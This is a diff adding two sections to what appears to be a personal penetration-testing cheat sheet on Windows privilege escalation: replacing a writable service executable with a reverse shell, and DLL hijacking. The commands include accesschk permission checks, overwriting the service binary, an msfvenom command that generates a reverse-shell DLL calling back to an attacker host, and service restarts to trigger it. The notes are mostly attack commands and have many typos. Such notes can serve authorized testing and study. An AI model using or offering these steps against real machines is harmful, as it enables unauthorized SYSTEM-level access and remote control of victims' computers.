@@ -130,8 +130,58 @@ Start the sercive to pop da shellz
 ```
 ###### Insecure Service Executables
 ```
+If a service exe is modifiable, can simply replace it with a reverse shell
+back up the original service or you are != 1337
+
+Check if the exe can be modified
+- .\accesschk.exe /accepteula -quvw "C:\PATH\TO\SERVICE\EXECUTABLEService"
+
+Can it be started and stoped
+- ./acesschk.exe \accepteula -uvqc <EXECUTABLService>
+
+backup the oringal (really good practice)
+- copy "C:\PATH\TO\SERVICE\EXECUTABLEService" C:\Temp
+
+Overwrite the oringal service executable
+
+- copy \Y C:\privvy\reverse.exe "C:\PATH\TO\SERVICE\EXECUTABLEService"
+
+Start the service to get poppin
+
+- net start EXECUTABLEService
+
+Copy the oringinal back for best practices
+```
+###### DLL Hijacking
+```
+A exe might try to load something from a dll, in short, we poisen the dll to get shell. the exe/dll will have to be executed as system to get a system shell 
+
+- Need dll to be writable by user
+- If a dll is missing, and user has write acess to that dir
+
+Check to see if the DLL has start/stop
+- accesschk.exe /accepteula -uvqc user <dll>
+
+Check to see what exe it is tied too. (Look for biary path name, and to see if it executes as system)
+- sc qc dllsvc 
+
+Need to get the DLL locally, to debug 
+
+Process Monitor the exact service, deslect registry and netowrk activity and then capture/ start the serivice/ will show you the dll search order. 
+
+Create a dll shell.
+
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f dll -o /tools/<NAME OF HIJACKED DLL>.dll
+
+Copy the .dll shell to the directory it would usually be called from.
+
+net stop dllsvc
+
+net start dllsvc
 
 ```
+
+
 ###### Enumerating Unmounted Disks for Windows
 ```
 mountvol
